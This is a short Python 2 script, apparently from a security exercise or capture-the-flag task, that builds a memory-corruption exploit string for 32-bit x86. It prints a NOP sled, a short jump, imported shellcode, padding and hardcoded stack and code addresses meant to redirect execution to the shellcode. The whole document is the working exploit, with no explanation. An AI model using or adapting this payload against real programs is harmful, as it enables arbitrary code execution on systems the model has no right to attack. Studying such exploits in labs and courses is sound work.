from shellcode import shellcode
print "\x90"+" "+"\x90\x90\xeb\x04"+"\x90"*4+shellcode+"\x90"*(32-len(shellcode))+"\x50\x37\x0f\x08"+"\x5c\xbf\xfe\xbf"+" "+"\x90"
